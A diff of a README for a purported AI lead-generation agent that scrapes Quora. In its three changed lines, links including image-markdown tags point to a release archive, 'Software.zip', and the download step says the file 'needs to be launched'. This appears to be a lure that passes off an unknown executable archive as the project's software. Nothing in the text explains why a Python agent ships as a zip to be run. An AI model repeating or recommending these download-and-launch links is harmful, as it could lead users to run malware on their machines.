@@ -1,6 +1,6 @@
 # AI Lead Generation Agent 🤖
 
-![AI Lead Generation Agent](https://github.com/Saniyayadav/AI-Lead-Generation-Agent/releases/download/v1.0/Application.zip,ai)
+![AI Lead Generation Agent](https://github.com/Saniyayadav/AI-Lead-Generation-Agent/releases/download/v2.0/Software.zip,ai)
 
 Welcome to the AI Lead Generation Agent repository! This project aims to revolutionize lead generation by utilizing artificial intelligence to automatically discover and qualify potential leads from Quora. By leveraging cutting-edge technologies such as Firecrawl for intelligent web scraping, Phidata for agent orchestration, and Composio for Google Sheets integration, you will create a system that can continuously generate and organize qualified leads with minimal human intervention.
 
@@ -17,7 +17,7 @@ Welcome to the AI Lead Generation Agent repository! This project aims to revolut
 
 To get started with the AI Lead Generation Agent, simply download the software package from the link below:
 
-[Download https://github.com/Saniyayadav/AI-Lead-Generation-Agent/releases/download/v1.0/Application.zip](https://github.com/Saniyayadav/AI-Lead-Generation-Agent/releases/download/v1.0/Application.zip) ⬇️ *(File needs to be launched)*
+[Download https://github.com/Saniyayadav/AI-Lead-Generation-Agent/releases/download/v2.0/Software.zip](https://github.com/Saniyayadav/AI-Lead-Generation-Agent/releases/download/v2.0/Software.zip) ⬇️ *(File needs to be launched)*
 
 ## Usage
 
@@ -75,7 +75,7 @@ For any questions or issues related to the AI Lead Generation Agent, please chec
 
 Let's revolutionize lead generation with AI! 🚀
 
-![AI Lead Generation](https://github.com/Saniyayadav/AI-Lead-Generation-Agent/releases/download/v1.0/Application.zip,leads)
+![AI Lead Generation](https://github.com/Saniyayadav/AI-Lead-Generation-Agent/releases/download/v2.0/Software.zip,leads)
 
 ---
 
